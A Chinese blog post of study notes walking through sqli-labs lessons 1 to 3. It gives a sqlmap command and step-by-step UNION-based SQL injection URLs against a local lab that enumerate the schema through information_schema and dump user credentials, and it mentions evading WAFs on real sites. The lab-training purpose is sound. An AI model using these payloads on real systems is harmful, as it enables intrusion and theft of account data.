---
title: sqli-labs_混合学习笔记less01-less04
categories:
- sql注入
tags:
- Unbantu
updated: 2018-05-07
---



 使用sqlmap进行注入的时候，确实是很方便，但是要是用不好的话，很多时候网站上都是有waf之类的，基本上很多站确定存在漏洞，但是只要是使用的话，全部都会被ban ip，所以现在重新用手工加部分sqlmap的方法进行注入学习。（手工还是要学习的，确定是跑不掉的。。。  要是有waf的话，需要更多的绕过技术。。。）

ps:     空格是%20        单引号%27            #是%23             双引号%22     等号 %3d

**sql-labs_less-1**（**GET – Error based – Single quotes – String** **基于错误的GET单引号字符型注入）**

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_01" />

先用sqlmap用一下，看下效果：（没waf当然很快啦...）

 `Sqlmap -u http://172.16.60.103/sql-labs/Less-1/?id=1 --dbs`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_02" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_03" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_04" />

手工：

`http://172.16.60.103/sql-labs/Less-1/?id=1%27`

加'之后报错：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_05" />

即存在漏洞

这个时候可以看下sql语句： `你的sql语句是：SELECT * FROM users WHERE id='1 order by 5 -- ' LIMIT 0,1` 

看到在id=''中，order by 在“中，所以要想猜字段的话，需要先将以前的语句进行闭合，闭合之后才可以继续猜解。（**ORDER BY 语句用于根据指定的列对结果集进行排序，而且是按照升序对记录进行排序**）

构造：`http://172.16.60.103/sql-labs/Less-1/?id=1' order by 5%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_06" />

这个时候有错误，然后依次尝试（其实可以使用数据结构中的二分法进行比较合适）

只有1，2，3是正常的，4的时候就开始出错了，显示结果超出。

使用select union语句：`http://172.16.60.103/sql-labs/Less-1/?id=1' union select 1,2,3%23`

页面并没有什么变化，这个时候只要将id=0，-1（非正数） 都行：

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,3%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_07" />

可以看到只有第二列和第三列的结果可以正常显示在网页上，但是这两个位置并不够用，需要使用数据库连接函数，常用的是concat ；concat_ws，其中concat_ws的第一个参数是连接字符串的分隔符。

user():返回当前数据库连接使用的用户

database():返回当前使用的数据库

version():返回当前数据库版本

在这里，concat_ws的第一个参数是连接字符串的分割符，下图可以看的很清楚：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_08" />

但是就算是这样的话，也不能直接进行传递的，因为在传的时候会被html编码，所以这个时候要使用mysql中的一个函数进行转化：char()   将十进制转化为字符 （：的十进制ASCII是 58   空格的十进制ASCII是30）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_09" />

然后进行构造： concat_ws(char(32,58,32),user(),database(),version())

放在里面直接进行判断有：（concat直接使用是NULL）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_10" />

构造语句有：`http://172.16.60.103/sql-labs/Less-1/?id=1' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())--+`

如果是这样的话，因为没有报错，所以是不会出现你所需要的信息的

需要将id=1 修改为 id= -1 （0 或者是shshh都行）

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())--+`

这个时候就有了报错信息，就可以得到你想要的数据了

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_11" />

依次是：  数据库用户root@localhost  ；数据库名字 security ；数据库版本5.5.53



然后就是查询接下来数据库中的表了：

mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表：

SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show  tables from schemaname的结果取之此表

COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show  columns from schemaname.tablename的结果取之此表。

注意，查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。

security的十六进制转换是：0x7365637572697479（可以使用在线转码工具，也可以使用hackbar，使用hackbar的时候记得前面要加上0x  代表16进制）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_12" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_13" />

直接使用security是无法进行查询到的，所以需要使用'  '  或者是使用十六进制（不需加''）

然后就是直接构造：

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,table_name from information_schema.tables where table_schema ='security'%23`

这个时候返回：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_14" />

但是发现此时只出现了一个表，名字是：emails

所以接下来使用**limit关键字**，

1.语法：

  *** limit [offset,] rows

  一般是用于select语句中用以从结果集中拿出特定的一部分数据。

  offset是偏移量，表示我们现在需要的数据是跳过多少行数据之后的，可以忽略；rows表示我们现在要拿多少行数据。比如：

  ①select * from mytbl limit 10000,100

​    上边SQL语句表示从表mytbl中拿数据，跳过10000行之后，拿100行

  ②select * from mytbl limit 0,100

​    表示从表mytbl拿数据，跳过0行之后，拿取100行

  ③select * from mytbl limit 100

​    这条SQL跟②的效果是完全一样的，表示拿前100条数据

​    但是在数据量不大或者是大数据量的前几页的时候，性能还算不坏，但是大数据量页码稍微大一点性能便下降比较严重。原因出在Limit的偏移量offset上，比如limit 100000,10虽然最后只返回10条数据，但是偏移量却高达100000，数据库的操作其实是拿到100010数据，然后返回最后10条。（关于这个，可以参考相关教程，这里就不讨论了）

例子：

sql语句根据条件查询指定数量的数据

SELECT * form 表名 WHERE 条件 limit 5,10; //检索6-15条数据

SELECT * form 表名 WHERE 条件 limit 5,-1; //检索6到最后一条数据

SELECT * form 表名 WHERE 条件 limit 5; //检索前5条数据

接下来：

limit 1,2 返回第二行和第三行，其中，1表示的是第二行，2表示的是行数为2

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_15" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_16" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_17" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_18" />

如果是超过字段的话，就不会显示：（空集）

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_19" />

在数据库中查看没有出入：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_20" />

接下来就是查询users表中的列：（users的信息比较重要）

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,column_name from information_schema.columns where table_schema ='security' and table_name='users' limit 1,2%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_21" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_22" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_23" />

在数据库中查询没有出入：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_24" />

在这里面，最重要的就是 username，password了

然后继续选择出来里面的值:

构造：

 `http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_25" />

依次对应的是：id，账户，密码

然后使用limit全部列出即可;

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_26" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_27" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_28" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_29" />

太多了。。。我就不列举了

或者是使用另外一种方法可以使用group分组取代limit将所有的信息列出来

如下：   使用group_concat()

`http://172.16.60.103/sql-labs/Less-1/?id=-1' union select 1,2,group_concat(char(32),username,char(32)) from users limit 0,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_30" />

这个时候就可以列出所有的账号了。。。

**sql-labs_less-2**   基于错误的GET整型注入

这个和第一个基本上都是一样的，唯一的区别就是$id 没有加单引号

那就和1是一样的，将-1后面的单引号去掉就好了，完整做一遍：

order by 猜字段：到4 的时候报错，1，2，3都是正常的

`http://172.16.60.103/sql-labs/Less-2/?id=-1 order by 4%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_01" />

然后和第一个一样：`http://127.0.0.1/Less-2/?id=-1 union select 1,2,concat_ws(char(32,58,32),version(),user(),database())%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_02" />

这个时候就知道了 数据库用户root@localhost  ；数据库名字 security ；数据库版本5.5.53

再次使用：  `http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema%20=%20%27security%27%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_03" />

一直使用limit，直到出现：users（出现是在limit 3,1%23）

`http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema%20=%20%27security%27%20and%20table_name%20=%20%27users%27%20limit%201,2%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_04" />

查询账号和密码：

`http://127.0.0.1/Less-2/?id=-1 union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23`

或者是使用group_concat()： `http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(char(32),username,char(32))%20from%20users%20limit%200,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_05" />

然后使用函数也可以获得password：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_06" />

结合两个函数使用的话，直接对应账号和密码：

`http://127.0.0.1/Less-2/?id=-1%20union%20select%201,2,group_concat(char(32),password,char(32),username,char(32))%20from%20users%20limit%200,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less2_07" />





**sql-labs_less-3**  **GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)** 

  多多练习手工技术：（**注意一定要让id的值为0，负等**）

再次记一下：

SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表

COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) %23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_01" />

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,table_name from information_schema.tables where table_schema = 'security' %23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_02" />

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,column_name from information_schema.columns where table_schema = 'security' and table_name = 'users' limit 1,1 %23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_03" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_04" />

then：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_05" />

`http://127.0.0.1/Less-3/?id=-1')  union select 1,2,group_concat(char(32),username,char(32)) from users limit 0,1%23`

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_06" />

<img src="{{ site.url }}/assets//blog_images/sqli-labs_less4_07" />



